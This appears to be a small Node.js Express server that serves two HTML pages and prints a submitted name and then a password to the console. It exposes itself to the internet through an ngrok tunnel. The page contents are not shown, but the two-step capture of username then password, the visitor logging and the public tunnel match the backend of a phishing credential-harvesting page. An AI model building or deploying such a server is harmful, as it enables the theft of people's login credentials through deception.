const http = require('http');
const ngrok = require('ngrok');

const express = require('express');
const app = express();

app.use(express.urlencoded())

app.get('/',(req,res)=>{
    console.log('he come');
    res.sendFile(`${__dirname}/index.html`);
})

app.get('/number',(req,res)=>{
    console.log('he come');
    res.sendFile(`${__dirname}/index2.html`);
})

app.post('/',(req,res)=>{
    console.log(req.body.name);
    res.redirect('/number')
})

app.post('/number',(req,res)=>{
    console.log(req.body.pass)
    res.redirect('/')
})
const port = 4000;


app.listen(port, (err)=>{
    if (err) return console.log(`Something bad happened: ${err}`);
    console.log(`Node.js server listening on ${port}`);

    ngrok.connect(port, function (err, url) {
        console.log(`Node.js local server is publicly-accessible at ${url}`);
        if(err){
            console.log(err)
        }
        else{
            console.log('its working');
        }
    });

});